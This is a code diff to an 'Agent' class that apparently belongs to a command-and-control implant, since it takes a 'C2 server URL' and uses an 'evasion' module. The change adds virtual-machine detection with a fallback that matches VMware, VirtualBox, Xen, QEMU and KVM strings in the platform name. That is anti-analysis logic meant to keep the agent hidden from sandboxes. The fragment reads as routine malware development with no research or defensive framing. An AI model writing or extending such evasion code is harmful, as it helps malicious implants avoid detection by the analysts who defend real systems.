@@ -520,8 +520,32 @@ class Agent:
             logging.info("Agent shutting down")
             
     def is_vm_detected(self):
-        """Check if running in VM using evasion module"""
-        return self.evasion.detect_vm()
+        """Check if we are running in a VM"""
+        try:
+            # Check if the evasion module has the detect_vm method
+            if hasattr(self.evasion, 'detect_vm'):
+                return self.evasion.detect_vm()
+            else:
+                # Fallback method if detect_vm is not available
+                vm_indicators = [
+                    "VMware",
+                    "VBox",
+                    "VBOX",
+                    "Xen",
+                    "QEMU",
+                    "KVM"
+                ]
+                
+                # Simple check for VM indicators
+                for indicator in vm_indicators:
+                    if indicator.lower() in platform.platform().lower():
+                        return True
+                        
+                # Not detected as VM
+                return False
+        except Exception as e:
+            logging.warning(f"Error in VM detection: {str(e)}")
+            return False
             
 if __name__ == "__main__":
     # Get C2 server URL from arguments or use default
